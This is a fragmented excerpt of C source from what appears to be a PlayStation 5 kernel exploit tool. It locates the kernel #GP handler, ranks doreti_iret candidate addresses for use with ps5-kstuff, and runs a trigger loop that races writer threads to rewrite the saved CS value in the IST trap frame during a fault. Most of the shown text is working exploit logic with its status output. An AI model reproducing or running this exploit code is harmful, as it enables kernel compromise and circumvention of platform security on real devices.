...
gp_trap_writer_fn(void *arg)
{
    ...
    /*
     * Only write CS — this is the sole field that determines whether
     * the kernel panics (CS & 3 == 0 → kernel-mode #GP → trap_fatal)
     * or delivers a signal (CS & 3 == 3 → user-mode fault → SIGBUS).
     *
...
broad_done:
    ...
    if (!have_strong_candidate && have_text_pa) {
        ...
        /* Read #GP gate (vector 13) and validate */
        {
            ...
            if (gp_handler_va < 0xFFFF800000000000ULL) {
        ...
        if (gp_handler_va != 0) {
            ...
            if (num_near_ptrs > 0) {
                ...
                /* Print all pointers sorted by distance for analysis.
                 * doreti_iret is typically at a small NEGATIVE offset
                 * from the #GP handler (same function or nearby in
                 * exception.S).  Pointers marked NEG-CLOSE are the
                 * strongest candidates even without verification. */
                send_response(sock,
                ...
                for (int i = 0; i < num_near_ptrs; i++) {
                    ...
                    /* Highlight negative offsets close to handler */
                    if (dist < 0 && dist > -0x2000) {
                        if (*note)
                            note = "HAS_V+2 NEG-CLOSE";
                        else
                            note = "NEG-CLOSE";
                    }
                    send_response(sock,
                 ...
                 * If no V/V+2 pair and no exception table hit,
                 * rank the best candidates by heuristic score.
                 * These can be tried directly in ps5-kstuff. */
                {
                    send_response(sock,
                        "\n  Ranked doreti_iret candidates "
                        "(top 8 from .data pointers):\n");
                    send_response(sock,
                        "  %-4s %-18s %-14s %-10s %s\n",
                        "rank", "text VA", "ktext+offset",
                        "dist", "confidence");
                    int shown = 0;
                    for (int i = 0;
                         i < num_near_ptrs && shown < 8; i++) {
                        uint64_t va = near_ptrs[i].text_va;
                        uint64_t koff = va - (uint64_t)ktext_base;
                        int64_t dist = near_ptrs[i].dist;
                        int conf = 50; /* base */
         ...
         */
        {
            ...
            if (num_cpus_found < 2) {
                send_response(sock, "  WARNING: only %d CPU(s) validated "
                              ...
                              "  Brief patch window (~10µs per attempt) — "
        ...
        send_response(sock, "  Starting trigger loop (50 attempts max)...\n");
        {
            ...
            while (!gp_trap_got_result &&
                ...
                /* Pre-populate IST trap frame with safe values.
                 *
                 * CS=0x43 means "user mode" — if the kernel handler
                 * reads CS before the CPU pushes the real frame, it
                 * sees user mode and delivers a signal (safe).
                 * After the CPU pushes CS=0x0020, the writer thread
                 * races to restore CS=0x43.
                 *
                 * Pre-populating keeps the cache line hot with 0x43,
                 * so the writer's store hits L1 immediately instead
                 * of paying a cold-cache-line fill penalty (~100+
                 * cycles on first access). */
                for (int i = 0xFD0; i < 0x1000; i += 8)
                    *(volatile uint64_t *)(istp + i) = 0;
                *(volatile uint64_t *)(istp + 0xFE0) = 0x43;  /* CS = user */
                ...
                *(volatile uint64_t *)(istp + 0xFF8) = 0x2B;  /* SS = user */
                ...
                /* Normal path: getcontext + setcontext */
                {
                    ...
                    /* Activate writers with brief RDTSC-based spin.
                     *
                     * usleep(500) has ~1ms granularity on FreeBSD
